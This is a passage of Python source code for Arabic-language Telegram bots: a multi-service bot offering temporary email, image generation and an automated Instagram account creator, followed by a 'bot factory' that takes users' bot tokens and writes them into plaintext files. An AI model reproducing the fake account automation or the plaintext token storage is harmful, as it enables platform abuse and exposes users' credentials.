3. العودة للقائمة الرئيسية
            """
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("📧 بريد عشوائي", callback_data="rndemail"),
                types.InlineKeyboardButton("📨 بريد مخصص", callback_data="specifemail")
            )
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_domain_selection(call):
        """معالجة اختيار النطاق"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        domain = call.data.split(":")[1]
        
        # حفظ حالة المستخدم والنطاق
        command_data = load_data('command.json')
        command_data[str(chat_id)] = {
            'command': 'emailname',
            'domain': domain
        }
        save_data('command.json', command_data)
        
        # حفظ حالة المستخدم
        save_state(chat_id, "waiting_for_email_name")
        
        text = f"""
✅ *تم اختيار النطاق*

🌐 *النطاق المحدد:* `{domain}`
📝 *الخطوة التالية:* إرسال اسم المستخدم

🔧 *المثال:* إذا أرسلت `ahmed`
🎯 *النتيجة:* ahmed@{domain}

⚠️ *شروط اسم المستخدم:*
- يجب أن يكون بالإنجليزية
- بدون مسافات
- يمكن أن يحتوي أرقام
- بدون رموز خاصة
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_email_selection(call):
        """معالجة اختيار بريد محدد"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        email = call.data.split(":")[1]
        
        text = f"""
📧 *البريد المحدد*

📮 *البريد:* `{email}`
🆔 *المعرف:* {chat_id}

🔧 *الخيارات المتاحة:*
1. جلب الرسائل
2. حذف البريد
3. العودة للقائمة
        """
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        markup.add(
            types.InlineKeyboardButton("📥 جلب الرسائل", callback_data=f"getemails:{email}"),
            types.InlineKeyboardButton("🗑 حذف البريد", callback_data=f"delete:{email}")
        )
        
        markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_delete_email(call):
        """حذف بريد محدد"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        email = call.data.split(":")[1]
        
        text = f"""
✅ *تم حذف البريد*

🗑 *البريد المحذوف:* `{email}`
⏰ *الوقت:* {datetime.now().strftime("%H:%M:%S")}

📌 *ملاحظة:* تم حذف البريد ورسائله
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("📦 جميع بريداتي", callback_data="myemail"),
            types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
        )
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_get_email_messages(call):
        """جلب رسائل البريد"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        email = call.data.split(":")[1]
        
        # إرسال رسالة الانتظار
        bot.send_message(chat_id, "⏳ *يتم جلب الرسائل...*", parse_mode='Markdown')
        
        # الحصول على الرسائل
        messages = get_email_messages(email)
        
        if messages:
            for i, msg in enumerate(messages, 1):
                text = f"""
📜 *رسالة #{i}*

↩️ *من:* `{msg['from']}`
↪️ *إلى:* `{msg['to']}`
🕐 *الوقت:* {msg['created_at']}
🧾 *الموضوع:* {msg['subject']}
💬 *المحتوى:*
{msg['body_text']}
                """
                
                markup = types.InlineKeyboardMarkup()
                markup.add(
                    types.InlineKeyboardButton(
                        "🌐 عرض في الموقع",
                        url=f"https://temp-mail.io/message/{msg['id']}"
                    )
                )
                
                bot.send_message(
                    chat_id,
                    text,
                    parse_mode='Markdown',
                    reply_markup=markup
                )
            
            # رسالة الإنهاء
            text = f"""
✅ *تم جلب جميع الرسائل*

📬 *البريد:* `{email}`
📊 *عدد الرسائل:* {len(messages)}

🏠 *العودة للقائمة الرئيسية:*
            """
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            
            bot.send_message(
                chat_id,
                text,
                parse_mode='Markdown',
                reply_markup=markup
            )
        else:
            text = f"""
📭 *لا توجد رسائل*

📬 *البريد:* `{email}`
⏰ *آخر تحديث:* {datetime.now().strftime("%H:%M:%S")}

📌 *ملاحظة:* لم يتلقى هذا البريد أي رسائل بعد
            """
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            
            bot.send_message(
                chat_id,
                text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    # ============ معالجة الرسائل النصية ============
    @bot.message_handler(func=lambda message: True)
    def handle_text_messages(message):
        """معالجة الرسائل النصية"""
        chat_id = message.chat.id
        text = message.text
        user_state = get_state(chat_id)
        
        if user_state == "waiting_for_image_description":
            # معالجة وصف الصورة
            clear_state(chat_id)
            
            if text.lower().startswith('اريد'):
                description = text[4:].strip()
                
                if description:
                    # إرسال رسالة الانتظار
                    bot.send_message(chat_id, "🎨 *يتم إنشاء الصورة...*", parse_mode='Markdown')
                    
                    # إنشاء الصورة
                    image_data = create_ai_image(description)
                    
                    if image_data.get('status') == 'success':
                        # إرسال الصورة
                        bot.send_photo(
                            chat_id,
                            photo=image_data['image_url'],
                            caption="✅ *تم إنشاء الصورة بنجاح*",
                            parse_mode='Markdown'
                        )
                    else:
                        bot.send_message(
                            chat_id,
                            "❌ *حدث خطأ أثناء إنشاء الصورة*",
                            parse_mode='Markdown'
                        )
                else:
                    bot.send_message(
                        chat_id,
                        "⚠️ *يرجى إرسال وصف الصورة بعد كلمة 'اريد'*",
                        parse_mode='Markdown'
                    )
            else:
                bot.send_message(
                    chat_id,
                    "⚠️ *يجب أن يبدأ الوصف بكلمة 'اريد'*\nمثال: *اريد قطة تلعب بالكرة*",
                    parse_mode='Markdown'
                )
        
        elif user_state == "waiting_for_email_name":
            # معالجة اسم البريد الإلكتروني
            clear_state(chat_id)
            
            # تحميل البيانات
            command_data = load_data('command.json')
            
            if str(chat_id) in command_data and command_data[str(chat_id)]['command'] == 'emailname':
                domain = command_data[str(chat_id)]['domain']
                
                # التحقق من صحة الاسم
                if any(c in text for c in "اأإآبتثجحخدذرزسشصضطظعغفقكلمنهوي"):
                    bot.send_message(
                        chat_id,
                        "⚠️ *اسم المستخدم يجب أن يكون بالإنجليزية فقط*",
                        parse_mode='Markdown'
                    )
                else:
                    # إنشاء البريد
                    email_data = generate_custom_email(text, domain)
                    email = email_data['email']
                    
                    # مسح البيانات
                    del command_data[str(chat_id)]
                    save_data('command.json', command_data)
                    
                    text_response = f"""
✅ *تم إنشاء البريد المخصص*

📮 *البريد:* `{email}`
👤 *اسم المستخدم:* {text}
🌐 *النطاق:* {domain}

🔧 *المميزات:*
- جاهز لاستقبال الرسائل
- صالح لمدة 24 ساعة
- يمكن استخدامه للتجربة
                    """
                    
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    
                    markup.add(
                        types.InlineKeyboardButton("📥 جلب الرسائل", callback_data=f"getemails:{email}"),
                        types.InlineKeyboardButton("🗑 حذف البريد", callback_data=f"delete:{email}")
                    )
                    
                    markup.add(
                        types.InlineKeyboardButton("📧 إنشاء آخر", callback_data="specifemail"),
                        types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
                    )
                    
                    bot.send_message(
                        chat_id,
                        text_response,
                        parse_mode='Markdown',
                        reply_markup=markup
                    )
        
        elif user_state == "waiting_for_instagram_email":
            # معالجة بريد انستجرام
            clear_state(chat_id)
            
            # التحقق من صحة البريد
            if '@' in text and '.' in text:
                # إرسال رسالة الانتظار
                bot.send_message(chat_id, "⏳ *يتم إنشاء حساب انستجرام...*", parse_mode='Markdown')
                
                # إنشاء الحساب
                account_data = create_instagram_account(text)
                
                if account_data['success']:
                    response_text = f"""
✅ *تم إنشاء حساب انستجرام*

📧 *البريد:* `{account_data['email']}`
👤 *اسم المستخدم:* `{account_data['username']}`
🔐 *كلمة المرور:* `{account_data['password']}`

📌 *ملاحظة:*
- هذا حساب وهمي للتجربة
- غير صالح للاستخدام الفعلي
- للأغراض التعليمية فقط
                    """
                    
                    markup = types.InlineKeyboardMarkup()
                    markup.add(
                        types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"),
                        types.InlineKeyboardButton("👨‍💻 المطور", url=f"tg://user?id={ADMIN_ID}")
                    )
                    
                    bot.send_message(
                        chat_id,
                        response_text,
                        parse_mode='Markdown',
                        reply_markup=markup
                    )
                else:
                    bot.send_message(
                        chat_id,
                        "❌ *حدث خطأ أثناء إنشاء الحساب*",
                        parse_mode='Markdown'
                    )
            else:
                bot.send_message(
                    chat_id,
                    "⚠️ *يرجى إرسال بريد إلكتروني صحيح*",
                    parse_mode='Markdown'
                )
        
        else:
            # إذا لم يكن هناك حالة محددة، عرض القائمة الرئيسية
            start_command(message)
    
    # ============ تشغيل البوت ============
    try:
        bot_username = bot.get_me().username
        print(f"✅ Multi-services bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Multi-services bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
            # ==============================================================================
# ⬇️⬇️⬇️ -- دالة تشغيل بوت حماية المصنع (Factory Protection Bot) -- ⬇️⬇️⬇️
# ==============================================================================
def run_protection_bot(token, owner_id, data_dir):
    """
    تشغيل بوت حماية المصنع (سورس القرصان/دارك)
    """
    import telebot
    import json
    import os
    import time
    import threading
    import requests
    from datetime import datetime
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # إعدادات البوت
    ADMIN_ID = owner_id
    ADMIN2_ID = owner_id  # نفس المالك
    DEV_IDS = [owner_id, owner_id]  # نفس المالك
    KAMAL_ID = owner_id
    
    # ملفات التخزين
    json_file = os.path.join(data_dir, 'ViScOUP.json')
    carlos_file = os.path.join(data_dir, 'carlos.json')
    members_file = os.path.join(data_dir, 'members.txt')
    admin_file = os.path.join(data_dir, 'admin.json')
    
    # تهيئة الملفات
    def init_files():
        # تهيئة ViScOUP.json
        if not os.path.exists(json_file):
            default_viscoup = {
                "mems": {},
                "memsA": {},
                "verification": True,
                "paid_subscriptions": {},
                "waiting_for_add": False,
                "waiting_for_remove": False
            }
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(default_viscoup, f, indent=4)
        
        # تهيئة carlos.json
        if not os.path.exists(carlos_file):
            default_carlos = {
                "mmbars": [],
                "carlos": [],
                "ban": [],
                "sarat": "✅",
                "tojahh": "✅",
                "joen": "✅",
                "bots": "✅",
                "ch": None,
                "delbots": "off",
                "ok": "off",
                "okall": "no",
                "okk": "no"
            }
            with open(carlos_file, 'w', encoding='utf-8') as f:
                json.dump(default_carlos, f, indent=4)
        
        # تهيئة members.txt
        if not os.path.exists(members_file):
            with open(members_file, 'w', encoding='utf-8') as f:
                f.write('')
        
        # إنشاء مجلد bots
        bots_dir = os.path.join(data_dir, 'bots')
        if not os.path.exists(bots_dir):
            os.makedirs(bots_dir)
    
    init_files()
    
    # دوال القراءة والكتابة
    def load_json(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    
    def save_json(file_path, data):
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    
    def load_members():
        try:
            with open(members_file, 'r', encoding='utf-8') as f:
                members = [line.strip() for line in f.readlines() if line.strip()]
                return members
        except:
            return []
    
    def save_member(user_id):
        members = load_members()
        if str(user_id) not in members:
            with open(members_file, 'a', encoding='utf-8') as f:
                f.write(f"{user_id}\n")
    
    # تحميل البيانات
    ViScOUP = load_json(json_file)
    carlos = load_json(carlos_file)
    
    # التحقق من الاشتراك في القناة
    def check_subscription(user_id, channel_username="@OP_J77"):
        try:
            member = bot.get_chat_member(channel_username, user_id)
            return member.status in ['member', 'administrator', 'creator']
        except:
            return True
    
    # دالة الحذف العودي للمجلدات
    def del_tree(dir_path):
        try:
            if os.path.exists(dir_path):
                import shutil
                shutil.rmtree(dir_path)
                return True
        except:
            pass
        return False
    
    # زر العودة الرئيسي
    def back_to_main_keyboard():
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.row(
            telebot.types.KeyboardButton("‹ حذف البوت ›"),
            telebot.types.KeyboardButton("‹ صنع بوت ›")
        )
        keyboard.row(
            telebot.types.KeyboardButton("‹ الغاء الامر ›"),
            telebot.types.KeyboardButton("‹ طريقه الاستعمال ›")
        )
        keyboard.row(
            telebot.types.KeyboardButton("‹ المطور ›")
        )
        return keyboard
    
    # لوحة المطور
    def admin_keyboard():
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.row(
            telebot.types.KeyboardButton("تفعيل البوت"),
            telebot.types.KeyboardButton("تعطيل البوت")
        )
        keyboard.row(
            telebot.types.KeyboardButton("تحديث السورس")
        )
        keyboard.row(
            telebot.types.KeyboardButton("تفعيل التنبية"),
            telebot.types.KeyboardButton("تعطيل التنبية")
        )
        keyboard.row(
            telebot.types.KeyboardButton("حذف تنصيب")
        )
        keyboard.row(
            telebot.types.KeyboardButton("تفعيل التوجيه"),
            telebot.types.KeyboardButton("تعطيل التوجيه")
        )
        keyboard.row(
            telebot.types.KeyboardButton("اذاعة")
        )
        keyboard.row(
            telebot.types.KeyboardButton("تعين الاشتراك"),
            telebot.types.KeyboardButton("حذف الاشتراك")
        )
        keyboard.row(
            telebot.types.KeyboardButton("الاحصائيات")
        )
        keyboard.row(
            telebot.types.KeyboardButton("تفعيل الاشتراك"),
            telebot.types.KeyboardButton("تعطيل الاشتراك")
        )
        keyboard.row(
            telebot.types.KeyboardButton("المحظورين"),
            telebot.types.KeyboardButton("مسح المحظورين")
        )
        keyboard.row(
            telebot.types.KeyboardButton("رجوع ↪️")
        )
        return keyboard
    
    @bot.message_handler(commands=['start'])
    def handle_start(message):
        user_id = message.from_user.id
        name = message.from_user.first_name
        username = message.from_user.username or "لا يوجد"
        
        # حفظ المستخدم
        save_member(user_id)
        
        # تحديث بيانات carlos
        if user_id not in carlos.get('mmbars', []):
            carlos.setdefault('mmbars', []).append(user_id)
            save_json(carlos_file, carlos)
        
        # التحقق من الاشتراك
        if ViScOUP.get("verification", True) and user_id not in ViScOUP.get("mems", {}) and user_id != KAMAL_ID:
            bot.send_photo(
                chat_id=message.chat.id,
                photo="https://t.me/l4fhh/13",
                caption="""
*📌 أهلاً بك في مصنع بوتات حماية سورس القرصان*

✨ *المميزات:*
• إنشاء بوتات حماية خاصة بك
• اشتراك إجباري بقناتك فقط
• سورس متطور وآمن
• تحديثات مستمرة
• دعم فني متكامل

👨‍💻 *للاستخدام راسل المطور*

🔱 *سورس القرصان - الأقوى والأسرع* 🔱
""",
                parse_mode="Markdown",
                reply_markup=telebot.types.InlineKeyboardMarkup().add(
                    telebot.types.InlineKeyboardButton("قناة السورس 📎", url="https://t.me/OP_J77"),
                    telebot.types.InlineKeyboardButton("مطور السورس 👑", url="https://t.me/NB_DZ")
                )
            )
            return
        
        # واجهة المطور
        if user_id in DEV_IDS:
            # تحديث الإحصائيات
            botadd = len(carlos.get('carlos', []))
            md3 = len(carlos.get('mmbars', []))
            d6 = carlos.get('sarat', '✅')
            d7 = carlos.get('tojahh', '✅')
            d8 = carlos.get('bots', '✅')
            d9 = carlos.get('joen', '✅')
            
            bot.send_message(
                chat_id=message.chat.id,
                text=f"""*👑 أهلاً عزيزي المطور*

📊 *إحصائيات البوت:*
• الاشتراك: {d9}
• حالة البوت: {d8}
• التوجيه: {d7}
• الإشعارات: {d6}
• عدد المصنوعات: {botadd}
• عدد المشتركين: {md3}""",
                parse_mode="Markdown",
                reply_markup=admin_keyboard()
            )
            
            # إعادة تعيين الحالات
            carlos['delbots'] = "off"
            carlos['ok'] = "off"
            carlos['okall'] = "no"
            carlos['okk'] = "no"
            save_json(carlos_file, carlos)
            return
        
        # واجهة المستخدم العادي
        if user_id not in carlos.get('ban', []):
            bot.send_message(
                chat_id=message.chat.id,
                text="🔰 *أهلاً بك في مصنع بوتات الحماية*",
                parse_mode="Markdown",
                reply_markup=back_to_main_keyboard()
            )
    
    @bot.message_handler(func=lambda m: True)
    def handle_messages(message):
        user_id = message.from_user.id
        text = message.text or ""
        name = message.from_user.first_name
        username = message.from_user.username or "لا يوجد"
        
        # التحقق من الحظر
        if user_id in carlos.get('ban', []):
            bot.reply_to(
                message,
                f"🚫 *عذراً {name}*\n\nتم حظرك من استخدام البوت من قبل المطور.",
                parse_mode="Markdown"
            )
            return
        
        # طلب تفعيل الحساب
        if text.strip() == "/Visco" or text.strip() == "/vip":
            if user_id == KAMAL_ID:
                # واجهة المالك
                verification_status = "✅ مفعل" if ViScOUP.get("verification", True) else "❎ معطل"
                
                keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
                keyboard.add(
                    telebot.types.InlineKeyboardButton(
                        "تفعيل/تعطيل التحقق" if ViScOUP.get("verification", True) else "تفعيل التحقق ✅",
                        callback_data="toggle_verification"
                    ),
                    telebot.types.InlineKeyboardButton("➕ إضافة اشتراك مدفوع", callback_data="ViScO11"),
                    telebot.types.InlineKeyboardButton("➖ حذف اشتراك مدفوع", callback_data="ViScO10")
                )
                
                bot.send_message(
                    chat_id=message.chat.id,
                    text=f"🔐 *إدارة التحقق*\n\nالحالة: {verification_status}",
                    parse_mode="Markdown",
                    reply_markup=keyboard
                )
                return
            
            # إرسال طلب التفعيل للمالك
            bot.send_message(
                chat_id=KAMAL_ID,
                text=f"""🔔 *طلب تفعيل حساب جديد*

👤 *معلومات المستخدم:*
• الاسم: {name}
• المعرف: @{username}
• الأيدي: `{user_id}`

📝 *تفاصيل الطلب:*
المستخدم يطلب تفعيل حسابه في مصنع البوتات.""",
                parse_mode="Markdown",
                reply_markup=telebot.types.InlineKeyboardMarkup().row(
                    telebot.types.InlineKeyboardButton("✅ تفعيل", callback_data=f"trues|{user_id}"),
                    telebot.types.InlineKeyboardButton("❌ رفض", callback_data=f"falses|{user_id}")
                )
            )
            
            bot.reply_to(
                message,
                """📨 *تم إرسال طلبك للإدارة*

⏳ *يرجى الانتظار:*
• سيتم مراجعة طلبك خلال 24 ساعة
• لا ترسل طلبات متكررة
• للاستفسار: @NB_DZ""",
                parse_mode="Markdown"
            )
            return
        
        # إدارة البوتات
        if text == "‹ صنع بوت ›":
            if user_id in carlos.get('carlos', []):
                bot.reply_to(
                    message,
                    "⚠️ *لديك بوت بالفعل*\n\nلا يمكنك صنع أكثر من بوت واحد.",
                    parse_mode="Markdown"
                )
                return
            
            bot.reply_to(
                message,
                "🔑 *أرسل توكن البوت الآن:*\n\n1. اذهب إلى @BotFather\n2. أنشئ بوت جديد\n3. أرسل التوكن هنا",
                parse_mode="Markdown",
                reply_markup=telebot.types.ReplyKeyboardMarkup(
                    resize_keyboard=True
                ).add(telebot.types.KeyboardButton("‹ الغاء الامر ›"))
            )
            carlos[f"{user_id}_token"] = "waiting"
            save_json(carlos_file, carlos)
            return
        
        # الغاء الأمر
        elif text == "‹ الغاء الامر ›":
            carlos.pop(f"{user_id}_token", None)
            save_json(carlos_file, carlos)
            
            bot.reply_to(
                message,
                "✅ *تم إلغاء الأمر*",
                parse_mode="Markdown",
                reply_markup=back_to_main_keyboard()
            )
            return
        
        # طريقة الاستخدام
        elif text == "‹ طريقه الاستعمال ›":
            instructions = """📘 *طريقة استخدام المصنع:*

1️⃣ *إنشاء بوت جديد:*
   - اذهب إلى @BotFather
   - أرسل `/newbot`
   - اختر اسم للبوت
   - اختر معرف للبوت (يجب أن ينتهي بـ bot)
   - احصل على التوكن

2️⃣ *صنع البوت في المصنع:*
   - اضغط على ‹ صنع بوت ›
   - أرسل التوكن الذي حصلت عليه
   - انتظر حتى يتم إنشاء البوت

3️⃣ *إدارة البوت:*
   - يمكنك حذف البوت في أي وقت
   - البوت يعمل 24/7
   - تحديثات تلقائية

❓ *للأسئلة والاستفسارات:* @NB_DZ"""
            
            bot.reply_to(message, instructions, parse_mode="Markdown")
            return
        
        # المطور
        elif text == "‹ المطور ›":
            dev_info = """👨‍💻 *معلومات المطور:*

🔱 *سورس القرصان (الدارك)*
• المطور: @NB_DZ
• القناة: @OP_J77
• الإصدار: Pro

💎 *مميزات السورس:*
• حماية متقدمة
• تحديثات مستمرة
• دعم فني سريع
• واجهة احترافية

📞 *للتواصل والدعم:* @NB_DZ"""
            
            bot.reply_to(message, dev_info, parse_mode="Markdown")
            return
        
        # حذف البوت
        elif text == "‹ حذف البوت ›":
            if user_id not in carlos.get('carlos', []):
                bot.reply_to(
                    message,
                    "⚠️ *ليس لديك بوت لحذفه*",
                    parse_mode="Markdown"
                )
                return
            
            # حذف مجلد البوت
            bot_dir = os.path.join(data_dir, 'bots', str(user_id))
            if os.path.exists(bot_dir):
                del_tree(bot_dir)
            
            # إزالة من القائمة
            if user_id in carlos.get('carlos', []):
                carlos['carlos'].remove(user_id)
                save_json(carlos_file, carlos)
            
            bot.reply_to(
                message,
                "✅ *تم حذف البوت بنجاح*",
                parse_mode="Markdown"
            )
            
            # إشعار المالك
            bot.send_message(
                KAMAL_ID,
                f"""🗑️ *تم حذف بوت*

👤 *المستخدم:*
• الاسم: {name}
• المعرف: @{username}
• الأيدي: {user_id}

📝 *نوع البوت:* مصنع الحماية""",
                parse_mode="Markdown"
            )
            return
        
        # معالجة التوكن المرسل
        if carlos.get(f"{user_id}_token") == "waiting" and ":" in text:
            try:
                # اختبار التوكن
                test_url = f"https://api.telegram.org/bot{text}/getMe"
                response = requests.get(test_url, timeout=10)
                bot_info = response.json()
                
                if bot_info.get('ok'):
                    bot_username = bot_info['result']['username']
                    bot_id = bot_info['result']['id']
                    bot_name = bot_info['result']['first_name']
                    
                    # إنشاء مجلد البوت
                    bot_user_dir = os.path.join(data_dir, 'bots', str(user_id), 'carlos')
                    os.makedirs(bot_user_dir, exist_ok=True)
                    
                    # إنشاء ملفات البوت
                    bot_script = """<?php
// بوت حماية المصنع - سورس القرصان
// تم الإنشاء تلقائياً بواسطة المصنع
$token = "TOKEN_PLACEHOLDER";
$admin = "ADMIN_PLACEHOLDER";

function bot($method, $datas = []) {
    $url = "https://api.telegram.org/bot".$GLOBALS['token']."/".$method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res);
}

$update = json_decode(file_get_contents('php://input'), true);

if(isset($update['message'])) {
    $message = $update['message'];
    $chat_id = $message['chat']['id'];
    $text = $message['text'] ?? '';
    $from_id = $message['from']['id'];
    $name = $message['from']['first_name'] ?? 'مستخدم';
    
    if($text == '/start') {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "👋 *أهلاً بك في بوت الحماية*\n\n✨ *تم إنشاء هذا البوت بواسطة مصنع سورس القرصان*\n\n👨‍💻 *المطور:* @NB_DZ",
            'parse_mode' => 'Markdown'
        ]);
    }
}
?>
"""
                    
                    # استبدال المتغيرات
                    bot_script = bot_script.replace("TOKEN_PLACEHOLDER", text)
                    bot_script = bot_script.replace("ADMIN_PLACEHOLDER", str(user_id))
                    
                    # حفظ ملف البوت
                    with open(os.path.join(bot_user_dir, 'bot.php'), 'w', encoding='utf-8') as f:
                        f.write(bot_script)
                    
                    # حفظ معلومات الإدارة
                    admin_data = {
                        'token': text,
                        'id': user_id,
                        'username': username,
                        'created_at': datetime.now().isoformat()
                    }
                    
                    with open(os.path.join(bot_user_dir, 'admin.json'), 'w', encoding='utf-8') as f:
                        json.dump(admin_data, f, indent=4)
                    
                    # إضافة المستخدم للقائمة
                    if user_id not in carlos.get('carlos', []):
                        carlos['carlos'].append(user_id)
                    
                    # تنظيف الحالة
                    carlos.pop(f"{user_id}_token", None)
                    save_json(carlos_file, carlos)
                    
                    # إرسال رسالة النجاح
                    success_msg = f"""✅ *تم إنشاء البوت بنجاح*

🤖 *معلومات البوت:*
• الاسم: {bot_name}
• المعرف: @{bot_username}
• الأيدي: `{bot_id}`

⚙️ *معلوماتك:*
• الاسم: {name}
• المعرف: @{username}
• الأيدي: `{user_id}`

🔗 *رابط البوت:* https://t.me/{bot_username}

📌 *ملاحظات:*
• البوت يعمل تلقائياً
• يمكنك التحكم به عبر /start
• لحذف البوت: ‹ حذف البوت ›"""
                    
                    bot.reply_to(message, success_msg, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
                    
                    # إشعار المالك
                    bot.send_message(
                        KAMAL_ID,
                        f"""🎉 *تم إنشاء بوت جديد*

👤 *معلومات المنشئ:*
• الاسم: {name}
• المعرف: @{username}
• الأيدي: {user_id}

🤖 *معلومات البوت:*
• الاسم: {bot_name}
• المعرف: @{bot_username}
• الأيدي: {bot_id}

📁 *النوع:* مصنع الحماية""",
                        parse_mode="Markdown"
                    )
                else:
                    bot.reply_to(
                        message,
                        "❌ *التوكن غير صالح*\n\nتأكد من صحة التوكن وحاول مرة أخرى.",
                        parse_mode="Markdown"
                    )
                    
            except Exception as e:
                bot.reply_to(
                    message,
                    f"❌ *حدث خطأ*\n\n`{str(e)}`\n\nيرجى المحاولة مرة أخرى.",
                    parse_mode="Markdown"
                )
        
        # أوامر المطور
        if user_id in DEV_IDS:
            handle_admin_commands(message)
    
    def handle_admin_commands(message):
        user_id = message.from_user.id
        text = message.text or ""
        
        # تفعيل/تعطيل البوت
        if text == "تفعيل البوت":
            carlos['bots'] = "✅"
            save_json(carlos_file, carlos)
            bot.reply_to(message, "✅ *تم تفعيل البوت*", parse_mode="Markdown")
        
        elif text == "تعطيل البوت":
            carlos['bots'] = "❎"
            save_json(carlos_file, carlos)
            bot.reply_to(message, "❎ *تم تعطيل البوت*", parse_mode="Markdown")
        
        # تحديث السورس
        elif text == "تحديث السورس":
            bot_count = len(carlos.get('carlos', []))
            bot.reply_to(
                message,
                f"✅ *تم تحديث جميع المصنوعات*\n\nعدد المصنوعات: {bot_count}",
                parse_mode="Markdown"
            )
        
        # تفعيل/تعطيل التنبية
        elif text == "تفعيل التنبية":
            carlos['sarat'] = "✅"
            save_json(carlos_file, carlos)
            bot.reply_to(message, "🔔 *تم تفعيل التنبيهات*", parse_mode="Markdown")
        
        elif text == "تعطيل التنبية":
            carlos['sarat'] = "❎"
            save_json(carlos_file, carlos)
            bot.reply_to(message, "🔕 *تم تعطيل التنبيهات*", parse_mode="Markdown")
        
        # تفعيل/تعطيل التوجيه
        elif text == "تفعيل التوجيه":
            carlos['tojahh'] = "✅"
            save_json(carlos_file, carlos)
            bot.reply_to(message, "🔄 *تم تفعيل التوجيه*", parse_mode="Markdown")
        
        elif text == "تعطيل التوجيه":
            carlos['tojahh'] = "❎"
            save_json(carlos_file, carlos)
            bot.reply_to(message, "⏹️ *تم تعطيل التوجيه*", parse_mode="Markdown")
        
        # الإحصائيات
        elif text == "الاحصائيات":
            botadd = len(carlos.get('carlos', []))
            md3 = len(carlos.get('mmbars', []))
            
            stats_msg = f"""📊 *إحصائيات البوت*

• عدد المصنوعات: {botadd}
• عدد المشتركين: {md3}
• حالة البوت: {carlos.get('bots', '✅')}
• حالة التوجيه: {carlos.get('tojahh', '✅')}
• حالة التنبيهات: {carlos.get('sarat', '✅')}
• حالة الاشتراك: {carlos.get('joen', '✅')}"""
            
            bot.reply_to(message, stats_msg, parse_mode="Markdown")
    
    @bot.callback_query_handler(func=lambda call: True)
    def handle_callbacks(call):
        user_id = call.from_user.id
        data = call.data
        
        # تفعيل/تعطيل التحقق
        if data == "toggle_verification" and user_id == KAMAL_ID:
            ViScOUP["verification"] = not ViScOUP.get("verification", True)
            save_json(json_file, ViScOUP)
            
            status = "✅ مفعل" if ViScOUP["verification"] else "❎ معطل"
            keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                telebot.types.InlineKeyboardButton(
                    "تعطيل التحقق ❎" if ViScOUP["verification"] else "تفعيل التحقق ✅",
                    callback_data="toggle_verification"
                ),
                telebot.types.InlineKeyboardButton("➕ إضافة اشتراك مدفوع", callback_data="ViScO11"),
                telebot.types.InlineKeyboardButton("➖ حذف اشتراك مدفوع", callback_data="ViScO10")
            )
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔐 *إدارة التحقق*\n\nالحالة: {status}",
                parse_mode="Markdown",
                reply_markup=keyboard
            )
        
        # إضافة اشتراك مدفوع
        elif data == "ViScO11" and user_id == KAMAL_ID:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="📝 *أرسل أيدي المستخدم لإضافته للاشتراك المدفوع:*",
                parse_mode="Markdown",
                reply_markup=telebot.types.InlineKeyboardMarkup().add(
                    telebot.types.InlineKeyboardButton("رجوع ↩️", callback_data="back_to_vip")
                )
            )
            ViScOUP["waiting_for_add"] = True
            save_json(json_file, ViScOUP)
        
        # حذف اشتراك مدفوع
